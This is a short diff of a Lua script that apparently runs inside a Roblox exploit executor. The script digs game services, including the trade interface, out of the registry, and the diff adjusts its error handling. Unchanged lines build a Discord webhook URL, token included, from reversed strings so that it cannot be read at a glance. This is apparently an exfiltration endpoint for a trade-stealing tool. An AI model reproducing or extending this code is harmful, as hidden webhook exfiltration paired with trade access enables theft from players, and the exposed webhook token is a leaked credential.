@@ -149,7 +149,7 @@ local success, RequiredServices = pcall(function()
     return RequiredServices
 end)
 
-if not (success and RequiredServices) then
+if not success or type(RequiredServices) == 'string' then
     success, RequiredServices = pcall(function()
         local RequiredServices = function()
             for _, object in next, getreg() do
@@ -164,11 +164,13 @@ if not (success and RequiredServices) then
         RequiredServices.TradeUI = debug.getupvalue(UISafeInit, 31)
         return RequiredServices
     end)
+
+    if not success or type(RequiredServices) == 'string' then
+        RequiredServices = nil
+    end
 end
 
 task.spawn(function()
-    getrenv().genv = getgenv()
-
     local url = ('/6768707493176498731/skoohbew/ipa/moc.drocsid//:sptth'):reverse()
     .. ('GMTLpRmJCDMeQS98ipy0nklZGr3BqLpGPCvXW_yLptv2mUfnBGMjgZCVs6sBpMD7nSa0'):reverse()
 
